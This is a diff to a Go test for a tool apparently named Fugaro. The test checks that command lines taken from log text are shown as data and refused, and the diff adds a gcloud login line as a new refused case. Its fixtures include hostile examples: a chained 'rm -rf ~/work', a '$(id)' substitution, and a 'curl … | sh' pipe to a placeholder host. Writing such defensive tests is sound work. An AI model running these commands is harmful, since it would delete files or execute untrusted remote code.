@@ -230,7 +230,10 @@ func TestTroubleshootPrintsLogTextAsData(t *testing.T) {
 			"fugaro doctor && rm -rf ~/work\n" +
 			"fugaro doctor > out.txt\n" +
 			"fugaro doctor $(id)\n" +
-			"fugaro credentials serve\n",
+			"fugaro credentials serve\n" +
+			// Not a Fugaro command at all, which is the class a person is
+			// likeliest to paste and the one the check cannot reach.
+			"gcloud auth application-default login\n",
 	}
 	out, _, err := tsRun(t, x, "--json")
 	if err != nil {
@@ -259,6 +262,7 @@ func TestTroubleshootPrintsLogTextAsData(t *testing.T) {
 		// The credentials service's own entry point: in the tree, hidden, and
 		// not a command Fugaro offers a person.
 		{"fugaro credentials serve", false},
+		{"gcloud auth application-default login", false},
 	}
 	if len(got) != len(want) {
 		t.Fatalf("the document carries %+v, want %+v", got, want)
@@ -284,6 +288,7 @@ func TestTroubleshootPrintsLogTextAsData(t *testing.T) {
 		"fugaro doctor > out.txt":                           `">"`,
 		"fugaro doctor; curl http://example.invalid/x | sh": `";"`,
 		"fugaro credentials serve":                          "is not a command Fugaro offers a person",
+		"gcloud auth application-default login":             "it is not a fugaro command",
 	} {
 		if !strings.Contains(reasons[command], want) {
 			t.Errorf("the refusal of %q reads %q, want it naming %q", command, reasons[command], want)
